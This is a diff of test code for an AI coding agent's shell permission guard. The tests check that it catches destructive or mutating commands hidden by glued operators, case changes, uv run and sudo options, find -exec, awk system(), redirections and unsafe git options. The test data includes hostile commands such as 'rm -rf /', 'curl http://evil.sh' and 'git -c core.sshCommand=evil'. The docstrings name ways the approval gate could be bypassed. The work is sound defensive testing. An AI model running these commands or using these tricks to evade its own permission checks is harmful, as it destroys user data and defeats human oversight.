@@ -207,10 +207,21 @@ def test_shell_mutation_reason_flags_hidden_subshell() -> None:
         "ls & curl http://evil.sh",  # `&` background separates a network command
         "ls |& curl http://evil.sh",  # `|&` pipe-both separates a network command
         "ls\ncurl http://evil.sh",  # unquoted newline separates a network command
+        "ls&rm -rf X",  # bare & glued — plain split sees one token, hiding rm
+        "git status&rm -rf X",  # same pattern with a git base command
+        "ls|&rm -rf X",  # bare |& glued — plain split sees one token, hiding rm
     ):
         assert shell_mutation_reason(cmd) is not None, cmd
-    # Quoted operators / redirections / trailing whitespace are not hidden commands.
-    for cmd in ("grep -r 'a|b' .", "ls | cat", "echo 'a;b'", "ls 2>&1", "ls -la\n"):
+    # Quoted operators / redirections / trailing whitespace / trailing background & are not hidden.
+    for cmd in (
+        "grep -r 'a|b' .",
+        "ls | cat",
+        "echo 'a;b'",
+        "ls 2>&1",
+        "ls -la\n",
+        "sleep 1 &",
+        "ls -la &",
+    ):
         assert shell_mutation_reason(cmd) is None, cmd
 
 
@@ -256,6 +267,7 @@ def test_shell_destructive_commands_classified() -> None:
         "git status & rm -rf /tmp/x",  # `&` (background) separates a second command
         "git status |& rm -rf /tmp/x",  # `|&` (pipe-both) separates a second command
         "ls\nrm -rf /tmp/x",  # unquoted newline separates a second command
+        "git status&rm -rf X",  # bare & glued — plain split misses the rm segment
     )
     for cmd in destructive:
         assert shell_destructive_reason(cmd) is not None, cmd
@@ -322,6 +334,45 @@ def test_shell_version_suffixed_interpreters_classified() -> None:
     for cmd in ("ls -la", "cat notes3.txt", "grep -r foo .", "rm2 foo"):
         assert shell_mutation_reason(cmd) is None, cmd
         assert shell_destructive_reason(cmd) is None, cmd
+
+
+def test_shell_guards_are_case_insensitive_on_base_command() -> None:
+    """Guards must not be bypassable by changing the case of the base command.
+
+    On macOS (case-insensitive HFS+/APFS), ``RM`` invokes ``rm`` — so
+    ``RM -rf /tmp/x`` is a real destructive command, not a typo.  All deny-list
+    sets are lowercase, so the base must be casefolded before membership tests.
+    """
+    from pythinker_code.soul.permission import (
+        shell_command_signature,
+        shell_destructive_reason,
+        shell_mutation_reason,
+    )
+
+    # All of these should be blocked by shell_mutation_reason.
+    for cmd in (
+        "RM -rf /tmp/x",
+        "Git push --force",
+        'PYTHON -c "import shutil"',
+        "NPM install",
+        'Bash -c "rm -rf /"',
+        "SUDO RM -rf /tmp/x",
+    ):
+        assert shell_mutation_reason(cmd) is not None, cmd
+
+    # The clearly destructive ones should also be caught by shell_destructive_reason.
+    for cmd in (
+        "RM -rf /tmp/x",
+        "Git push --force",
+        'Bash -c "rm -rf /"',
+    ):
+        assert shell_destructive_reason(cmd) is not None, cmd
+
+    # Case variants must produce the same signature so an approval can't be
+    # minted for 'GIT push origin main' independently of 'git push origin main'.
+    assert shell_command_signature("GIT push origin main") == shell_command_signature(
+        "git push origin main"
+    )
 
 
 @pytest.mark.skipif(
@@ -579,6 +630,102 @@ async def test_toolset_denies_plugin_tool_in_read_only_profile(
     assert "permission profile blocks external tool" in result.return_value.message
 
 
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
+)
+def test_uv_subnamespaces_and_run_classified() -> None:
+    """uv pip/tool/python sub-namespaces and uv run must be classified correctly.
+
+    uv is in _PACKAGE_MANAGER_COMMANDS but its mutating verbs live under sub-namespaces
+    (uv pip install, uv tool install, uv python install); _first_non_option returns
+    'pip'/'tool'/'python' which are not in _PACKAGE_MANAGER_MUTATIONS, so they slip
+    through without this fix.  uv run <cmd> reaches an arbitrary interpreter/command
+    and must recurse into the trailing command via the segment classifiers.
+    """
+    from pythinker_code.soul.permission import shell_destructive_reason as D
+    from pythinker_code.soul.permission import shell_mutation_reason as M
+
+    # Sub-namespace installs must be mutating.
+    for cmd in (
+        "uv pip install requests",
+        "uv tool install ruff",
+        "uv python install 3.12",
+    ):
+        assert M(cmd) is not None, f"expected mutating: {cmd!r}"
+
+    # Top-level uv verbs already caught by the existing path must still work.
+    for cmd in ("uv add foo", "uv sync"):
+        assert M(cmd) is not None, f"expected mutating: {cmd!r}"
+
+    # uv run reaching a mutating/interpreter command must be mutating.
+    for cmd in (
+        'uv run python -c "import shutil"',
+        "uv run rm -rf /tmp/x",
+    ):
+        assert M(cmd) is not None, f"expected mutating: {cmd!r}"
+
+    # uv run reaching an irreversible command must be destructive.
+    for cmd in (
+        "uv run rm -rf /tmp/x",
+        'uv run python -c "x"',
+        'uv run bash -c "x"',
+    ):
+        assert D(cmd) is not None, f"expected destructive: {cmd!r}"
+
+    # Read-only uv commands must remain benign.
+    for cmd in (
+        "uv pip list",
+        "uv pip show requests",
+        "uv run pytest -q",
+        "uv tree",
+        "uv lock --check",
+    ):
+        assert M(cmd) is None, f"expected benign (M): {cmd!r}"
+
+
+def test_uv_run_option_prefix_does_not_bypass_classification() -> None:
+    """`uv run`'s own options must not mask the wrapped command.
+
+    _uv_run_payload returned every token after `run`, so a leading uv-run option
+    (`--no-sync`, `--`, `--python 3.12`, `--with requests`, …) became the apparent
+    command and the real destructive command after it slipped past both the read-only
+    mutation guard and the auto-mode destructive deliberation gate.
+    """
+    from pythinker_code.soul.permission import shell_destructive_reason as D
+    from pythinker_code.soul.permission import shell_mutation_reason as M
+
+    # Boolean flags, `--` end-of-options, and value-taking options before the command
+    # must all be skipped so the wrapped `rm -rf` is still classified.
+    for cmd in (
+        "uv run --no-sync rm -rf /tmp/x",
+        "uv run --isolated rm -rf /tmp/x",
+        "uv run --frozen rm -rf /tmp/x",
+        "uv run -- rm -rf /tmp/x",
+        "uv run --python 3.12 rm -rf /tmp/x",
+        "uv run --with requests rm -rf /tmp/x",
+        'uv run --no-sync python -c "import shutil"',
+        # Real value-taking options (long + short) skip their value, not the command.
+        "uv run --package foo rm -rf /tmp/x",
+        "uv run -P pkg rm -rf /tmp/x",
+        "uv run --no-extra x rm -rf /tmp/x",
+        # An option NOT in the value-opt set is treated as boolean (skip the flag
+        # only) so the real command is still reached — never swallowed as a "value".
+        "uv run --constraint rm -rf /tmp/x",
+        "uv run --some-future-flag rm -rf /tmp/x",
+    ):
+        assert M(cmd) is not None, f"expected mutating: {cmd!r}"
+        assert D(cmd) is not None, f"expected destructive: {cmd!r}"
+
+    # Benign commands behind uv-run options stay benign (options skipped, the real
+    # command classified, not over-flagged).
+    for cmd in (
+        "uv run --no-sync pytest -q",
+        "uv run --python 3.12 pytest",
+        "uv run -- pytest -q",
+    ):
+        assert M(cmd) is None, f"expected benign (M): {cmd!r}"
+
+
 async def test_step_permission_profile_snapshot_blocks_same_step_plan_exit_race(
     runtime: Runtime,
     environment: Environment,
@@ -697,3 +844,137 @@ async def test_read_only_shell_in_root_agent_still_requests_approval(
 
     assert not result.is_error
     assert "run command" in approval_requested, "root agent should still request approval"
+
+
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
+)
+def test_wrapper_value_option_does_not_swallow_command() -> None:
+    """Wrapper options that take a separate-word value must not consume the real command.
+
+    ``sudo -u root rm -rf /tmp/x`` must unwrap to ``rm``, not ``root``.  Before
+    the fix, the inner option-stripping loop stops after popping ``-u`` and the
+    next token (``root``) is treated as the wrapped command.
+    """
+    import shlex
+
+    from pythinker_code.soul.permission import (
+        _unwrap_command,
+        shell_destructive_reason,
+        shell_mutation_reason,
+    )
+
+    # Core unwrap contract: value-option + value are both consumed, real command surfaces.
+    cmd_tok, cmd_args = _unwrap_command(shlex.split("sudo -u root rm -rf /tmp/x"))
+    assert cmd_tok == "rm", f"expected 'rm', got {cmd_tok!r}"
+    assert cmd_args == ["-rf", "/tmp/x"], f"unexpected remaining args: {cmd_args!r}"
+
+    # The real rm must be classified as destructive.
+    assert shell_destructive_reason("sudo -u root rm -rf /tmp/x") is not None
+    # GNU time: -o takes a filename argument.
+    assert shell_destructive_reason("time -o out.txt rm -rf /tmp/x") is not None
+    # Mutation check via sudo -g (group value-option).
+    assert shell_mutation_reason("sudo -g wheel touch f") is not None
+
+
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
+)
+def test_find_xargs_awk_classified() -> None:
+    """find -delete/-exec, xargs, and awk system() are classified as mutating/destructive.
+
+    find -delete is an in-place mutation; find -exec/-execdir runs arbitrary payloads;
+    xargs passes stdin tokens to a trailing command; awk with system() or '>' can run or
+    redirect outside awk.  Classification is recursive — the payload is re-classified
+    through the same segment classifiers so 'find -exec rm -rf' routes to destructive too.
+    Benign find / xargs-to-grep remain unclassified.
+    """
+    from pythinker_code.soul.permission import shell_destructive_reason as D
+    from pythinker_code.soul.permission import shell_mutation_reason as M
+
+    # Mutating (M must not be None)
+    for cmd in (
+        "find . -name x -delete",
+        "find . -exec rm -rf {} +",
+        "find . -execdir touch f {} ;",
+        "echo x | xargs rm -rf",
+        "awk 'BEGIN{system(\"rm -rf /tmp/x\")}'",
+    ):
+        assert M(cmd) is not None, f"expected mutating: {cmd!r}"
+
+    # Destructive (D must not be None)
+    for cmd in (
+        "find . -exec rm -rf {} +",
+        "echo x | xargs rm -rf",
+        "find . -execdir rm -rf {} ;",
+    ):
+        assert D(cmd) is not None, f"expected destructive: {cmd!r}"
+
+    # Benign (M must be None)
+    for cmd in (
+        'find . -name "*.py" -print',
+        "find . -type f",
+        "echo x | xargs grep foo",
+    ):
+        assert M(cmd) is None, f"expected benign: {cmd!r}"
+
+
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell mutation guard examples use POSIX"
+)
+def test_glued_output_redirection_classified() -> None:
+    """Glued redirection forms (no whitespace before >) must be flagged as output
+    redirection, while fd-dup (2>&1, >&2) and quoted operators stay benign.
+
+    The whitespace-anchored regex misses 'echo evil>>~/.zshrc' and 'echo evil>out.txt'
+    because there is no space before the operator. The punct-lexer scan catches these
+    by isolating unquoted > / >> / &> / &>> as standalone tokens.
+    """
+    from pythinker_code.soul.permission import shell_mutation_reason as M
+
+    # Flagged: output redirection to a real file target
+    for cmd in (
+        "echo evil>>~/.zshrc",
+        "echo evil>out.txt",
+        "echo x 1>out",
+        "echo data &>>log",
+        "cat secrets>>~/.bashrc",
+    ):
+        assert M(cmd) == "output redirection", f"expected flagged: {cmd!r}"
+
+    # Benign: quoted operators, fd-dup (>&), /dev/null sinks
+    for cmd in (
+        'grep "a>b" file',
+        'grep "a>>b" f',
+        "ls 2>&1",
+        "ls -la &> /dev/null",
+        "echo x >&2",
+        "ls > /dev/null",
+    ):
+        assert M(cmd) is None, f"expected benign: {cmd!r}"
+
+
+@pytest.mark.skipif(
+    platform.system() == "Windows", reason="Shell destructive guard examples use POSIX"
+)
+def test_unsafe_git_global_option_is_destructive() -> None:
+    """Unsafe git global options must route to the deliberation gate.
+
+    ``-c``, ``--config-env``, and ``--exec-path`` can execute arbitrary commands
+    even through read-only subcommands like ``log``; the destructive guard must flag
+    them so auto-mode triggers one-shot deliberation rather than auto-approving.
+    Regression: clean read-only git (log/diff/status with no unsafe globals) must
+    remain non-destructive so it stays auto-approvable.
+    """
+    from pythinker_code.soul.permission import shell_destructive_reason as D
+
+    # Positive: unsafe global options flagged as destructive
+    assert D("git -c core.pager=evil log") is not None
+    assert D("git -c core.sshCommand=evil fetch origin") is not None
+    assert D("git --exec-path=/tmp/evil log") is not None
+    assert D("git --config-env=x.y=Z log") is not None
+
+    # Regression: clean read-only git stays non-destructive
+    assert D("git log --oneline") is None
+    assert D("git diff") is None
+    assert D("git status") is None
